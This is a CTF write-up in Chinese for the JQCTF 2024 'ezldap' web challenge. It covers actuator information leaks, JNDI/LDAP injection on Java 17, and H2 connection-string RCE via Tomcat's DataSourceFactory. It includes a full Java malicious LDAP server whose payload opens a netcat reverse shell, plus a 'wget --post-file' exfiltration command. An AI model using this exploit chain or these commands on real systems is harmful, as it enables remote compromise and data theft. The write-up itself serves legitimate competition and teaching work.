# ezldap

JQCTF 2024 Quals web challenge

## 题解

### 信息泄露

这是一道无源码题，因此首先需要从环境中获取一些信息。题目在主页明示了这是一个Spring Boot应用，因此尝试访问`/actuator/`端点获得一些有用的信息。

比如在`/actuator/env`中，可以获得Java版本为17，同时存在一个`com.sun.jndi.ldap.object.trustSerialData`为`false`的开关。

在`/actuator/mappings`中，可以获得所有的路由，发现存在一个`/source_tr15d0`的源码接口。

在`/actuator/configprops`和`/actuator/conditions`中，可以获得已加载的类，进而推断出存在什么依赖。

通过分析`/actuator/heapdump`可以获得更详细的Java版本信息和依赖信息。

### ldap注入

在`/source_tr15d0`中可以获得部分源码

```java
@GetMapping("/lookup")
public String lookup(String path) {
    try {
        String url = "ldap://" + path;
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(url);
        return "ok";
    }catch (NamingException e){
        return "failed";
    }
}
```

这是一个很明显的ldap注入。关于ldap/jndi注入的细节可以参考`https://tttang.com/archive/1405/`浅蓝师傅的文章。考虑到Java版本较高，因此传统的codebase已经失效，而经典的`org.apache.naming.factory.BeanFactory`也由于Tomcat的[版本过高失效](https://github.com/apache/tomcat/blob/9.0.83/java/org/apache/naming/factory/BeanFactory.java#L128)。因此需要寻找其他的利用途径。

首先观察一下`com.sun.jndi.ldap.object.trustSerialData`选项的具体效果，参考代码[VersionHelper.java](https://github.com/openjdk/jdk17u-dev/blob/1c40f899c9c736998ba38e805d88361e53511c64/src/java.naming/share/classes/com/sun/jndi/ldap/VersionHelper.java#L52)和[Obj.java](https://github.com/openjdk/jdk17u-dev/blob/1c40f899c9c736998ba38e805d88361e53511c64/src/java.naming/share/classes/com/sun/jndi/ldap/Obj.java#L227)。在Obj.java中调用`VersionHelper.isSerialDataAllowed`判断是否允许在解码对象时执行反序列化。因此通过LDAP打反序列化这条路也被堵死。

```java
// Get codebase, which is used in all 3 cases.
String[] codebases = getCodebases(attrs.get(JAVA_ATTRIBUTES[CODEBASE]));
try {
    if ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != null) {
        if (!VersionHelper.isSerialDataAllowed()) {
            throw new NamingException("Object deserialization is not allowed");
        }
        ClassLoader cl = helper.getURLClassLoader(codebases);
        return deserializeObject((byte[])attr.get(), cl);
    } else if ((attr = attrs.get(JAVA_ATTRIBUTES[REMOTE_LOC])) != null) {
        // For backward compatibility only
        return decodeRmiObject(
            (String)attrs.get(JAVA_ATTRIBUTES[CLASSNAME]).get(),
            (String)attr.get(), codebases);
    }

    attr = attrs.get(JAVA_ATTRIBUTES[OBJECT_CLASS]);
    if (attr != null &&
        (attr.contains(JAVA_OBJECT_CLASSES[REF_OBJECT]) ||
            attr.contains(JAVA_OBJECT_CLASSES_LOWER[REF_OBJECT]))) {
        return decodeReference(attrs, codebases);
    }
    return null;
}
```

因此最后就是寻找实现了`ObjectFactory`的factory，在浅蓝师傅的文章中提到了很多可以使用的类，我们可以根据之前的信息泄露对比这些类的利用条件，找到能够利用的factory。最终的结果就是`Tomcat Connection Pool`的`org.apache.tomcat.jdbc.pool.DataSourceFactory`。关于找到这个factory我不知道各位是否被卡了多久了，但至少在我中午放出提示前没有队伍完成这道题。实际上也可也从`/actuator/conditions`中查找已经加载的类，或者从`/actuator/heapdump`中搜索classpath，都可以分析出该应用的依赖。


与其他的JDBC factor一样，`org.apache.tomcat.jdbc.pool.DataSourceFactory`也可以通过给定的一些参数发起一个新的数据库连接。

### h2数据库RCE

利用h2数据库的连接字符串RCE也是一个比较经典的技巧了，可以参考Boogipop师傅的文章`https://xz.aliyun.com/t/13931#toc-2`。通过h2连接字符串的INIT参数可以指定初始化脚本并执行SQL。在SQL中使用`CREATE ALIAS EXEC`可以使用Java代码创建函数，再使用`CALL EXEC`来调用创建的函数。

### 利用脚本

可以使用com.unboundid.ldap搭建一个ldap server，填充参数完成RCE。

这里有一个比较有趣的地方，在利用factory连接到h2数据库时，我们向ldap客户端传递的实际上是一个Reference对象，而一些开源工具对Reference对象的编码方式是，将其序列化后放在`javaSerializedData`字段内，如[LDAPRefServer.java](https://github.com/cckuailong/JNDI-Injection-Exploit-Plus/blob/49f7d43f2e016d81d428164adb22ee0b58109198/src/main/java/jndi/LDAPRefServer.java#L175)。题目设置了`com.sun.jndi.ldap.object.trustSerialData`开关阻止了`javaSerializedData`的反序列化。通过阅读Obj.java的代码可以发现，Reference对象有自己的编码方式，无需通过序列化传递。

给出一个完整利用代码：

```java
package org.example;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;


import javax.naming.RefAddr;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class Main {
    private static final String LDAP_BASE = "dc=example,dc=com";


    public static void main(String[] args) {
        int port = 1389;
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry entry = new Entry(base);
            try {
                System.out.println("Send LDAP reference");
                entry.addAttribute("objectClass", "javaNamingReference");

                String url = "jdbc:h2:mem:memdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
                        "INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"test\"\\;}'\\;" +
                        "CALL EXEC ('nc x.x.x.x yyyy -e /bin/sh')\\;";

                Reference ref = new Reference("javax.sql.DataSource", "org.apache.tomcat.jdbc.pool.DataSourceFactory", null);
                ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
                ref.add(new StringRefAddr("url", url));
                ref.add(new StringRefAddr("initialSize", "1"));
                ref.add(new StringRefAddr("username", "sa"));
                encodeReference('#', ref, entry);

                result.sendSearchEntry(entry);Reference
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } catch (Exception e) {
                e.printStackTrace();
            }
        }


        private void encodeReference(char separator, Reference ref, Entry attrs) {

            String s;

            if ((s = ref.getClassName()) != null) {
                attrs.addAttribute("javaClassName", s);
            }

            if ((s = ref.getFactoryClassName()) != null) {
                attrs.addAttribute("javaFactory", s);
            }

            if ((s = ref.getFactoryClassLocation()) != null) {
                attrs.addAttribute("javaCodeBase", s);
            }

            int count = ref.size();

            if (count > 0) {
                String refAttr = "";
                RefAddr refAddr;

                for (int i = 0; i < count; i++) {
                    refAddr = ref.get(i);

                    if (refAddr instanceof StringRefAddr) {
                        refAttr = ("" + separator + i +
                                separator + refAddr.getType() +
                                separator + refAddr.getContent());
                    }
                    attrs.addAttribute("javaReferenceAddress", refAttr);
                }

            }
        }

    }
}
```

如果直接尝试反弹bash，通常会失败。我们可以使用一些简单的方法来判断他是什么环境，比如执行一个`/bin/bash`，页面会回显failed，如果执行`/bin/ash`，页面会回显ok，说明他是个alpine发行版。或者使用`wget --post-file /etc/issue http://xxxx`来获得发行版信息。

### 坑点

1. 在h2中创建函数的函数名不能重复，如果重复会导致报错无法执行命令，可以在函数名后面加入一个随机字符串，使得脚本每次运行都可用。

2. 题目环境是alpine，由于这一点比较隐晦，导致我被多位师傅拷打。但个人认为题目环境也是包含在需要探测的信息中，本题的意义也是希望师傅们通过各种方法来获取到题目的java版本，依赖项和发行版的信息。

最后对被“本地通了、远程没通”折磨的师傅道个歉，呜呜。